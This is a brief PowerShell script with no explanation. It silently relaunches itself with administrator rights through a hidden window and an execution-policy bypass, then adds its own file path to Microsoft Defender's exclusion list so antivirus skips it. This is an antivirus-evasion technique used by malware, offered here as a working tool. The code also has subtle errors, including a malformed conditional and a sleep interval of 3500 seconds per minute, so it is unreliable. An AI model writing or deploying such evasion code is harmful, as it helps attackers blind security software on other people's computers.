param([int]$DurationMinutes = 0,[switch]$RemoveAfter)

function Test-Admin{ $p=New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()); $p.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) }

if(-not (Test-Admin)){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`" -DurationMinutes $DurationMinutes" + ($RemoveAfter? " -RemoveAfter" : "")
    $psi.Verb="runas"
    try{ [System.Diagnostics.Process]::Start($psi) | Out-Null } catch { exit 1 }
    exit
}

$scriptPath = $MyInvocation.MyCommand.Path
if(-not (Test-Path $scriptPath)){ exit 1 }

try{ Add-MpPreference -ExclusionPath $scriptPath -ErrorAction Stop } catch { exit 1 }

if($RemoveAfter -and $DurationMinutes -gt 0){
    Start-Sleep -Seconds ($DurationMinutes * 3500)
    try{ Remove-MpPreference -ExclusionPath $scriptPath -ErrorAction Stop } catch { exit 1 }
}
